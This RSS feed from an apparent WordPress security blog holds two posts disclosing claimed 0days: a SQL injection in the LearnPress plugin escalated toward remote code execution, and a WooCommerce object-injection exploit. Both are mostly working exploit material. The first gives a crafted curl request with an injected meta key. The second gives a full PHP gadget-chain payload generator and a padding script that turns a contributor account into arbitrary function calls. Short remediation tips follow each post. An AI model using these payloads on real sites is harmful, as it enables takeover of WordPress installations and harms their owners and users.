<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>plugins &#8211; WP deeply</title>
	<atom:link href="https://wpdeeply.com/category/plugins/feed/" rel="self" type="application/rss+xml" />
	<link>http://wpdeeply.com/</link>
	<description></description>
	<lastBuildDate>Tue, 21 Jul 2020 21:02:46 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.4.2</generator>
	<item>
		<title>LearnPress SQLi to RCE</title>
		<link>https://wpdeeply.com/learnpress-sqli-to-rce/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Tue, 21 Jul 2020 21:02:44 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=167</guid>

					<description><![CDATA[Few months back security research regarding WP learning platforms got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE. Eli5 PoC Into function&#160;learn_press_duplicate_post_meta&#160;which is called from&#160;learn_press_duplicate_post&#160;we have the following: From [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>Few months back <a href="https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/" target="_blank" rel="noreferrer noopener">security research regarding WP learning platforms</a> got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#eli5-poc"></a>Eli5 PoC</h2>



<p>Into function&nbsp;<code>learn_press_duplicate_post_meta</code>&nbsp;which is called from&nbsp;<code>learn_press_duplicate_post</code>&nbsp;we have the following:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">	function learn_press_duplicate_post_meta( $old_post_id, $new_post_id, $excerpt = array() ) {
		global $wpdb;
		$post_meta_infos = $wpdb->get_results( "SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$old_post_id" );
		if ( count( $post_meta_infos ) != 0 ) {
			$excerpt       = array_merge( array( '_edit_lock', '_edit_last' ), $excerpt );
			$excerpt       = apply_filters( 'learn_press_excerpt_duplicate_post_meta', $excerpt, $old_post_id, $new_post_id );
			$sql_query     = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
			$sql_query_sel = array();
			foreach ( $post_meta_infos as $meta ) {
				if ( in_array( $meta->meta_key, $excerpt ) ) {
					continue;
				}
				if ( $meta->meta_key === '_lp_course_author' ) {
					$meta->meta_value = get_current_user_id();
				}
				$meta_key        = $meta->meta_key;
				$meta_value      = addslashes( $meta->meta_value );
				$sql_query_sel[] = "SELECT $new_post_id, '$meta_key', '$meta_value'";
			}
			$sql_query .= implode( " UNION ALL ", $sql_query_sel );
			$wpdb->query( $sql_query );
		}
	}
</code></pre>



<p>From previous reports&nbsp;<code>$meta_value</code>&nbsp;was reported as SQLi vulnerable parameter, but&nbsp;<code>$meta_key</code>&nbsp;wasn&#8217;t?! Having on mind that we talk about WP then we all know that if we have permissions to edit post, then we have permissions to add custom fields (meta fields)</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.setup/wp-admin/admin-ajax.php' --data $'_ajax_nonce=0&amp;action=add-meta&amp;metakeyselect=%23NONE%23&amp;metakeyinput=sqli\'payload&amp;metavalue=anything&amp;_ajax_nonce-add-meta=47cfdb164d&amp;post_id=[lesson_id]'
</code></pre>



<p>In order to execute the SQLi and to be able to insert custom/meta field with any meta value, we need only to duplicate the lesson. Then we have the following <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<pre class="wp-block-code"><code class="">[Tue Jul 21 22:16:08.289659 2020] [:error] [pid 24069] [client ::1:47077] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '', 'boom'' at line 1 for query INSERT INTO wp_postmeta (post_id, meta_key, meta_value) SELECT 107, 'count_items', '0' UNION ALL SELECT 107, '_lp_duration', '30 minute' UNION ALL SELECT 107, '_lp_preview', 'no' UNION ALL SELECT 107, 'boom'test', 'boom' made by require_once('wp-admin/admin.php')... LP_Lesson_CURD->duplicate, learn_press_duplicate_post, learn_press_duplicate_post_meta
</code></pre>



<p>What we can achieve with possibility to insert any meta value? Well that depends of plugin itself and WP setup. If we check the LearnPress code then we can notice following in&nbsp;<code>learnpress.php</code>:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">require_once 'inc/class-lp-debug.php';
</code></pre>



<p>and this is important because:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">public function __destruct() {
		if ( ! $this->_handles ) {
			return;
		}
		foreach ( $this->_handles as $handle ) {
			@fclose( $handle );
		}
	}
</code></pre>



<p>e.g. <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">same situation as WooCommerce</a> => hello RCE <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#few-facts"></a>Few facts</h2>



<ul><li>I tried to warn researchers</li><li>Do not allow interesting gadget chains in your PHP code</li><li>Limit what could be unserialized in your php.ini</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#remediation"></a>Remediation</h2>



<ul><li>Do not allow SQLi in your code <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li><li>Do not trust input</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WooCommerce MySQL replace to RCE</title>
		<link>https://wpdeeply.com/woocommerce-mysql-replace-to-rce/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sat, 18 Jul 2020 23:05:51 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=156</guid>

					<description><![CDATA[This bug is 0day, but same as this bug was reported in the past. Try to fix here&#160;and fix here. Anyway, in the Woo code there is another DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>This bug is 0day, but same as this bug was reported in the past. Try to fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/08/29/woocommerce-3-4-5-security-fix-release-notes/" target="_blank">here</a>&nbsp;and fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/10/11/woocommerce-3-4-6-security-fix-release-notes/" target="_blank">here</a>. Anyway, in the Woo code there is <a rel="noreferrer noopener" href="https://github.com/woocommerce/woocommerce/blob/master/includes/class-wc-post-data.php#L169" target="_blank">another</a> DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, yet this bug is exploitable from contributor user role. See full exploitation via this video.</p>



<figure class="wp-block-video"><video controls src="https://wpdeeply.com/wp-content/uploads/2020/07/scotch-dolly.mp4"></video><figcaption>How to RCE Woo via contributor user role.</figcaption></figure>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#eli5-poc"></a>Eli5 PoC</h2>



<p>In order someone to be able to exploit issue like this, two things are needed.</p>



<ul><li>PHP gadget chain (Woo have one)</li><li>knowledge about data that will be replaced (it is public data in any Woo instance e.g. shown in product page)</li></ul>



<p>Woo PHP gadget chain generator that will survive&nbsp;<code>wc_clean</code></p>



<pre class="wp-block-code"><code lang="php" class="language-php">define("WOO_POC_WIZZARD", TRUE);
if (WOO_POC_WIZZARD){
    if ( isset($argv) &amp;&amp; is_array($argv) ){
        if ( sizeof($argv) >= 2 ){
            $call_func = $argv[1];
            $call_func_params = array_slice($argv, 2);
        }else{
            echo "Usage php poc_woo.php print_r input1 input2 ...\n";
            exit();
        }
    }elseif(isset($_REQUEST) &amp;&amp; is_array($_REQUEST) ){
        if (sizeof($_REQUEST) >= 1 &amp;&amp; isset($_REQUEST["func"])) {
            $call_func = $_REQUEST["func"];
            $call_func_params = isset($_REQUEST["param"])?$_REQUEST["param"]:array();
        }else{
            echo "&lt;p>Usage http://your_localhost/poc_woo.php?func=print_r".htmlentities("&amp;")."param[0]=test".htmlentities("&amp;")."param[1][0]=test2".htmlentities("&amp;")."param[1][1]=test2&lt;/p>";
            exit();
        }
    }
}else{
    echo "Set \$call_func and \$call_func_params by hand here\n";
    /*
     $call_func = "print_r";
     $call_func_params = array(array(1,2,3), "search1", "search2");
     //*/
}
class Requests_Utility_FilteredIterator extends ArrayIterator {
    protected $callback;
    public function __construct($data, $callback) {
        parent::__construct($data);
        $this->callback = $callback;
    }
    public function current() {
        $value = parent::current();
        $value = call_user_func($this->callback, $value);
        return $value;
    }
}
class WC_Log_Handler{
}
class WC_Log_Handler_File extends WC_Log_Handler {
    protected $handles = array();
    function __construct($call_func, $call_func_params){
        //seccond argument e.g. print_r is the function that will be called. Could be any php/wp function
        //each array member from the constructor first argument is the input towards the function
        $this->handles = new Requests_Utility_FilteredIterator($call_func_params, $call_func);
    }
}
//create test object
$test_obj = new WC_Log_Handler_File($call_func, $call_func_params);
//string e.g. serialized object
$serialized_obj = serialize($test_obj);
//make it to go trough filters for control characters like wp text sanitation mechanisms
$serialized_obj = str_replace('s:10:"'."\x00".'*'."\x00".'handles"', 'S:10:"\00\2A\00\68\61\6E\64\6C\65\73"', $serialized_obj);
$serialized_obj = str_replace('s:11:"'."\x00".'*'."\x00".'callback"', 'S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B"', $serialized_obj);
//correct the size of "Requests_Utility_FilteredIterator":_number_: with +22
preg_match('/_FilteredIterator":([0-9]+):/s', $serialized_obj, $found);
$serialized_obj = str_replace($found[0], '_FilteredIterator":'.($found[1]+22).':', $serialized_obj);
//print the test payload
if ( isset($argv) ){
    echo "\n#######payload#######\n";
    echo $serialized_obj."\n";
    echo "#######payload#######\n\n";
}else{
    echo "#######payload#######&lt;br/>";
    echo $serialized_obj."&lt;br/>";
    echo "#######payload#######&lt;br/>";
}
exit();
</code></pre>



<p>this output will be used as input towards final payload generator where we need another constraint: number of bytes that will be added or removed (below script will work for bytes adding and for every number of bytes added payload can be generated)</p>



<pre class="wp-block-code"><code lang="php" class="language-php">//grab it from some payload generator Woo/WP or PHP related 
//https://gist.github.com/Slavco/946905eef6f9cb0f03a2ed2bdee83d9c
$payload_real = 'O:19:"WC_Log_Handler_File":1:{S:10:"\00\2A\00\68\61\6E\64\6C\65\73";C:33:"Requests_Utility_FilteredIterator":101:{x:i:0;a:1:{i:0;s:11:"ScotchDolly";};m:a:1:{S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B";s:9:"error_log";}}}';

$payload_prepend = '";i:777;'; //chances to have something similar in real payload are marginal so we can use as starting point
$payload_append  = '}';//to finish the serialized string array in this case
$payload_pre_final = $payload_prepend.$payload_real.$payload_append;

//could be anything - this is for this current Woo case :)
$change_str = 's:6:"pa_boo";s:3:"woo";';

$change_in_bytes_plus = 5;
//todo change in bytes minus

$repeat = 0;
$cnt = 1;
do{
    
    $mod = mb_strlen($payload_pre_final) % $change_in_bytes_plus;
    $repeat = mb_strlen($payload_pre_final) / $change_in_bytes_plus;
    if ( $mod !== 0 ){
        $tmp = '";i:'.str_repeat("7", (3+$cnt)).';';
        $old = '";i:'.str_repeat("7", (3+$cnt-1)).';';
        $payload_pre_final = str_replace($old, $tmp, $payload_pre_final);
    }
    $cnt++;
}while( $mod !== 0);

echo urlencode(str_repeat($change_str, $repeat).$payload_pre_final);
exit();
</code></pre>



<p>Now everything left is to add this payload as item of meta value array and to name it&nbsp;<code>%11_default_attributes</code>&nbsp;(url encoded) in order to prevent protected meta check and MySQL query to consider it as desired data that need to be changed.</p>



<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE {$wpdb->postmeta} SET meta_value = REPLACE( meta_value, %s, %s ) WHERE meta_key = '_default_attributes'...
</code></pre>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#few-facts"></a>Few facts</h2>



<ul><li>Changing a byte from serialized content results with unserialize of user input, because its format</li><li>PHP serialization is faster than json on big data sets</li><li>When someone say do not change serialized string, it means <a href="https://files.ripstech.com/slides/OWASP_AppSec_EU18_WordPress.pdf" target="_blank" rel="noreferrer noopener">do not</a>. &#8211; another core security issue <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#remediation"></a>Remediation</h2>



<ul><li>Put constraints into your php ini regarding serialization</li><li>Sign your content, so any change from outside world will be detected and not processed</li></ul>



<p></p>
]]></content:encoded>
					
		
		<enclosure url="https://wpdeeply.com/wp-content/uploads/2020/07/scotch-dolly.mp4" length="29631978" type="video/mp4" />

			</item>
	</channel>
</rss>
